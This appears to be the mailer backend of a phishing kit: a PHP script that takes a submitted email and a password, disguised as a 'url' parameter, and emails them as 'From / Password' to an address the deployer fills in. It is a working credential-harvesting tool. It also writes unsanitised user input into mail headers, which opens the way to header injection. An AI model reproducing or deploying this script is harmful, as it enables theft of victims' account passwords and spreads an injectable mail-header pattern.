<?
$email  = $_REQUEST["email"];
$url = $_REQUEST["url"];
$to    = "you@yourdomain.com"; // ENTER YOUR EMAIL ADDRESS
if (isset($url) && isset($email)) {
    $email_subject = "$name sent you a message via YOUR SITE NAME"; // ENTER YOUR EMAIL SUBJECT
		$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=iso-8859-1" . "\r\n";
$headers .= "From: ".$email." <".$url.">\r\n"."Reply-To: ".$url."\r\n" ;
$msg     = "From: $email<br/> Password: $url";
	
   $mail =  mail($to, $email_subject, $msg, $headers);
  if($mail)
	{
		echo 'success';
	}

else
	{
		echo 'failed';
	}
}

?>